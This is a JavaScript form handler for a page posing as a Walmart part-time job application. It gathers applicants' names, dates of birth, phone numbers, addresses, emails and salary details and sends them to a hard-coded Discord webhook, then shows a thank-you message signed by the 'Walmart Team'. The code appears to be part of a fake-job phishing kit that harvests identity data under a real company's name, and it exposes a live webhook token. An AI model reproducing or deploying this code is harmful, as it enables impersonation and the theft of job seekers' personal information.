document.getElementById('jobForm').addEventListener('submit', function(event) {
    event.preventDefault(); // Prevent default form submission

    // Get form data
    const formData = new FormData(this);
    const formObject = Object.fromEntries(formData.entries());

    // Validate form fields
    for (let key in formObject) {
        if (formObject[key] === '' && key !== 'altMobileNumber') {
            alert(`Please fill out the ${key.replace(/([A-Z])/g, ' $1').toLowerCase()}.`);
            return;
        }
    }

    // Prepare data to send to Discord webhook
    const messageContent = `
        New Job Application:
        First Name: ${formObject.firstName}
        Last Name: ${formObject.lastName}
        Gender: ${formObject.gender}
        Date of Birth: ${formObject.dob}
        Mobile Number: ${formObject.mobileNumber}
        Alternate Mobile Number: ${formObject.altMobileNumber}
        Address: ${formObject.address}
        Work Location: ${formObject.workLocation}
        Email: ${formObject.email}
        Hours: ${formObject.hours}
        Days Working: ${formObject.daysWorking}
        Current Last Month's Drawn Salary: ${formObject.currentSalary}
        Expected Salary Per Month: ${formObject.expectedSalary}
        Own Laptop: ${formObject.ownLaptop ? 'Yes' : 'No'}
        Terms and Conditions: ${formObject.terms ? 'Agreed' : 'Not Agreed'}
    `;

    // Send data to Discord webhook
    fetch('https://discord.com/api/webhooks/1136612984559501353/b7niOW24Nq-329K9LNg0IN5gGRbeLGyPwobkYCbQqDZ-GUCQ3UVG3n_cx3zOwxILdbIC', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            content: messageContent,
        }),
    })
    .then(response => {
        // Handle cases where the response might not be valid JSON
        if (!response.ok) {
            return response.text().then(text => { throw new Error(text); });
        }
        // Return nothing as Discord webhook responses are often empty
        return response.text(); 
    })
    .then(() => {
        // Hide the form and display the thank you message
        document.getElementById('jobForm').style.display = 'none';
        document.body.innerHTML += `
            <div style="text-align: center; margin-top: 50px;">
                <h2>Thanks for applying for part-time jobs at Walmart, ${formObject.firstName}!</h2>
                <p>Our team will contact you shortly if your application is shortlisted.</p>
                <p>Best regards,<br>Walmart Team<br>Email: <a href="mailto:hr@walmart.com">hr@walmart.com</a></p>
            </div>
        `;
    })
    .catch(error => {
        console.error('Error:', error);
        alert(`There was an error submitting your application: ${error.message}`);
    });
});
